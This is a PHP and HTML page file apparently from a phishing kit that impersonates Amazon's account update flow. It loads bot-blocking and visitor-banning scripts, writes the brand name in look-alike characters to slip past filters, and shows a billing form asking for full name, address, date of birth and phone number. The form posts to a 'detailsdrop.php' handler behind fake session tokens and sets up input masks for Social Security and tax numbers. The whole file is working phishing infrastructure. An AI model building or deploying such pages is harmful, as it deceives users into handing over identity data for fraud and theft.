<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include('../banned.php');?>
<!-- HTML INPUTS FOR BILING PAGE -->
<!-- CODE STARTS HERE -->
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<form method="POST" action="detailsdrop.php?cmd=_update-information&account_card=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>">
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">Full name
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="full_name" name="full_name" onkeydown="upperCaseF(this)" autocomplete="off" required="" pattern="[A-Za-z].{6,}" value="" placeholder="Full name" class="a-declarative a-input-text"  maxlength="30" />
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-recipient-email" class="aok-inline-block">Address line 1
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="add_1" name="add_1" style="text-transform: capitalize;"  autocomplete="off" class="a-declarative a-input-text" required="" title="Please Enter a valid address line" placeholder="Street address, P.O. box, company name." />
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-sender-name">Address line 2
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="add_2" value="" autocomplete="off" class="a-declarative a-input-text" title="Please Enter a valid address line" placeholder="Apartment, suite, unit, building, floor, etc." name="add_2" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">City
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" style="text-transform: capitalize;" id="city" value="" autocomplete="off" placeholder="City" required="" title="Please Enter a valid city name" maxlength="30" class="a-declarative a-input-text" name="city" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">State/Province/Region
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" style="text-transform: capitalize;" id="state" value="" autocomplete="off" maxlength="50" required="" title="Please Enter a valid State/Province/Region name" placeholder="State/Province/Region" name="state" class="a-declarative a-input-text" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">Zip Code
      </label>
      <div class="a-input-text-wrapper ">
        <input type="tel" id="ZIP" value="" autocapitalize="" autocomplete="off" class="a-declarative a-input-text" maxlength="8" required="" title="Please Enter a valid ZIP code" placeholder="Zip Code" name="ZIP" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">Country
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" readonly id="asv-allowances-title" value="" autocomplete="off" class="a-declarative a-input-text" placeholder="<?php  echo $COUNTRYNAME; ?>" >
      </div>
    </div>
  </div>
<script type="text/javascript" src="../data/js/jquery.js"></script><script type="text/javascript" src="../data/js/jquery.min.mask.js"></script><script src="../data/js/jquery.maskedinput.js" type="text/javascript"></script>
  <?php 
if ($COUNTRYCODE=="US" or $COUNTRYCODE=="FSM"){ echo '
<script type="text/javascript">
jQuery(function($){
$("#DOB").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
});
</script>
';}
else { echo '
<script type="text/javascript">
jQuery(function($){
$("#DOB").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
});
</script>
';}
?>	
  <script type="text/javascript">
    jQuery(function($){
      $("#phone").mask("(999) 999-9999");
      $("#tin").mask("99-9999999");
      $("#ssn").mask("999-99-9999");
    }
          );
  </script>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">Date of Birth
      </label>
      <div class="a-input-text-wrapper ">
        <input type="tel" required="" title="Please Enter a valid Date of Birth" placeholder="<?php if ($COUNTRYCODE=="US"){ echo 'MM/DD/YYYY';} else { echo 'DD/MM/YYYY';}?>" id="DOB" name="DOB" value="" autocomplete="off" class="a-declarative a-input-text"  maxlength="50" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">Phone number
      </label>
      <div class="a-input-text-wrapper ">
        <input type="tel" id="phone" placeholder="Phone number" name="phone" value="" autocomplete="off" class="a-declarative a-input-text" maxlength="50" >
      </div>
    </div>
  </div>
  <?php  ################################################################################################################################### ?>
  <div class="a-section a-spacing-extra-large a-spacing-top-extra-large">
    <div class="a-popover-preload" id="a-popover-legalTerms">
      <span>By clicking "Save &amp; Continue", you agree to &Alpha;m&#97;zon.
        <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'s privacy notice and conditions of use.
      </span>
    </div>
    <h3 class="a-spacing-mini">
      &Alpha;m&#97;zon Update Terms
    </h3>
    <span class="a-declarative" data-action="a-secondary-view" data-a-secondary-view="{&quot;name&quot;:&quot;legalTerms&quot;,&quot;position&quot;:&quot;triggerVertical&quot;}">
      <a href="#" class="a-touch-link a-box">
        <div class="a-box-inner">
          <i class="a-icon a-icon-touch-link">
          </i>
          <span class="a-size-small a-color-tertiary">
            By clicking "Save &amp; Continue", you agree to &Alpha;m&#97;zon.
            <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'s privacy notice and conditions of use. 
          </span>
        </div>
      </a>
    </span>
  </div>
  <?php  ################################################################################################################################### ?>
  <div class="a-section a-spacing-top-extra-large">
    <span class="a-button a-button-span12 a-button-primary">
      <span class="a-button-inner">
        <button id="submit" class="a-button-text" type="submit">Save &amp; Continue</button>
      </span>
    </span>
  </div>
</form>
<!-- CODE ENDS HERE -->
